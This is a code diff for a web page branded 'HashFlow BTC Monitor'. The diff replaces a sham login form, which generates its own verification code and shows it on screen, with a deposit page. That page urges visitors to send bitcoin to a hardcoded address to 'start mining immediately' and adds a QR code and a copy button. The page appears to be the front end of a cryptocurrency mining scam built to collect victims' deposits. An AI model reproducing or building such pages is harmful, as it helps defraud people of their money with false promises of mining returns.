@@ -2,51 +2,37 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Login – HashFlow BTC Monitor</title>
+<title>HashFlow BTC Monitor</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
 body {background: linear-gradient(135deg, #0b0f1a, #1a1f2f); color:white; font-family:Arial,sans-serif; text-align:center; padding:40px;}
-.card {max-width:400px; margin:auto; background:#131a2e; padding:25px; border-radius:14px; box-shadow:0 0 20px rgba(0,0,0,0.5);}
-input {width:80%; padding:10px; margin:10px 0; border-radius:6px; border:none; font-size:14px;}
-button {padding:10px 18px; margin:10px 5px; background:#f2a900; border:none; color:black; font-weight:bold; border-radius:6px; cursor:pointer;}
-.hidden {display:none;}
+.card {max-width:420px; margin:auto; background:#131a2e; padding:30px; border-radius:14px;}
+h1 {color:#f2a900;}
+p {font-size:14px; line-height:1.5;}
+.btc-box {background:#0b0f1a; padding:15px; border-radius:8px; word-break:break-all; margin:15px 0; font-size:14px;}
+button, a {display:inline-block; margin-top:20px; padding:14px 22px; background:#f2a900; color:black; text-decoration:none; border-radius:8px; font-weight:bold; cursor:pointer;}
+img.qr {margin-top:15px; width:150px; height:150px;}
 </style>
 </head>
 <body>
 <div class="card">
-<h2>HashFlow BTC Monitor</h2>
-<p>Sign in to access your mining dashboard</p>
+<h1>HashFlow BTC Monitor</h1>
+<p>Send BTC to the address below to start mining immediately and track your balance in real-time!</p>
 
-<div id="step1">
-<input type="text" id="emailPhone" placeholder="Enter Email or Phone" required>
-<br>
-<button onclick="sendCode()">Get Code</button>
+<h3>Deposit BTC</h3>
+<div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
+<button onclick="copyAddress()">Copy Address</button>
+<div>
+<img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav" alt="BTC QR Code">
 </div>
 
-<div id="step2" class="hidden">
-<p>We sent a code to your email/phone:</p>
-<input type="text" id="codeInput" placeholder="Enter Code">
-<br>
-<button onclick="verifyCode()">Verify</button>
-</div>
-
-<p id="message" style="color:#f2a900;font-size:14px;"></p>
+<a href="login.html">Start Mining</a>
 </div>
 
 <script>
-let generatedCode = "";
-function sendCode(){
-  const user = document.getElementById("emailPhone").value.trim();
-  if(user===""){ alert("Please enter your email or phone number."); return; }
-  generatedCode = Math.floor(100000 + Math.random()*900000).toString();
-  document.getElementById("message").innerText = `Your verification code is: ${generatedCode}`;
-  document.getElementById("step1").classList.add("hidden");
-  document.getElementById("step2").classList.remove("hidden");
-}
-function verifyCode(){
-  const input = document.getElementById("codeInput").value.trim();
-  if(input === generatedCode){ window.location.href = "dashboard.html"; }
-  else{ alert("Incorrect code. Try again."); }
+function copyAddress(){
+  const btc = document.getElementById('btcAddress').innerText;
+  navigator.clipboard.writeText(btc).then(()=>{ alert('BTC address copied!'); });
 }
 </script>
 </body>
